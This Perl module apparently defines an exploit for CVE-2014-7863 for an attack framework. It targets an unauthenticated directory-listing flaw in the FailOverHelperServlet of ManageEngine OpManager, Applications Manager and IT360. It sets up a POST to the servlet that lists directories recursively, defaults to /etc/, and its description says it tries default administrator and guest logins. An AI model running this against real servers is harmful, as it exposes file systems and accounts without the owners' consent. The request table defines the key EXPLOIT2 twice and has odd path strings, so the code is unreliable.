package MANAGEENGINE::MSF::ManageengineDirListing;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ManageengineDirListing";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-7863",
  DESCRIPTION => "

        This module exploits a directory listing information disclosure vulnerability in the

        FailOverHelperServlet on ManageEngine OpManager, Applications Manager and IT360. It

        makes a recursive listing, so it will list the whole drive if you ask it to list / in

        Linux or C:\\ in Windows. This vulnerability is unauthenticated on OpManager and

        Applications Manager, but authenticated in IT360. This module will attempt to login

        using the default credentials for the administrator and guest accounts; alternatively

        you can provide a pre-authenticated cookie or a username / password combo. For IT360

        targets enter the RPORT of the OpManager instance (usually 8300). This module has been

        tested on both Windows and Linux with several different versions. Windows paths have to

        be escaped with 4 backslashes on the command line. There is a companion module that

        allows for arbitrary file download. This vulnerability has been fixed in Applications

        Manager v11.9 b11912 and OpManager 11.6.

      ",
  METHOD => "POST",
  MSF_MODULE => "manageengine_dir_listing",
  OSVDB => 117696,
  PATH => "servlet,servlet?operation=listdirectory&rootDirectory=__ROOTDIRECTORY__&",
  PATHS => ["", "servlet,servlet", "servlet,servlet"],
  PAYLOAD => "",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Jan/114",
    "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt",
  ],
  VARIABLES => {
    'ROOTDIRECTORY' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'TIMESTAMP' =>       { DESCRIPTION => "", VALUE => "" },
    'DIRECTORY' =>       { DESCRIPTION => "Path of the directory to list", VALUE => "/etc/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
